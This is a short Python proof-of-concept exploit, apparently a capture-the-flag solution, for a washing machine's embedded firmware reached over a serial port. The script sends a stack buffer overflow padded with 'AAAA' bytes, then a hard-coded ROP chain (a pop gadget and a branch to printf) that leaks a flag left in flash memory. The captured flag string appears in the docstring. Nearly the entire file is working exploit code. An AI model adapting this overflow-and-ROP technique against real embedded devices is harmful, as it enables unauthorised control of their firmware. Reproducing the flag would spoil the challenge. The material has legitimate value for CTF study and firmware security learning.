import serial
from pwn import *
from time import sleep

"""
PoC-Sploit for washing machine.
Simple buffer overflow, some straight forward ropping to print the flag.
(Which is still in memory, as memset0 on the flash ROM doesn't have any
effect).
$ python2 sploit.py                                                                                                                                                     :(
ph0wn{wtf_man?!_memset0_on_rom}
"""

def main():
    s = serial.Serial('/dev/ttyUSB0')
    s.read_until('shell\r\n')
    s.write('3\n')
    s.read_until(':')


    pl = 'AAAA' * 7
    pl += p32(0x080038e5) #  pop {r0, r1, r2, r6, pc}
    pl += p32(0x20000cdc)
    pl += p32(0x0800edc6)
    pl += p32(0xdeadbeef)
    pl += p32(0xdeadbeef)
    pl += p32(0x8000395) #bl printf

    s.write(pl+'\r\n')
    sleep(1)
    print s.read_all()[-31:]








if __name__ == '__main__':
    main()
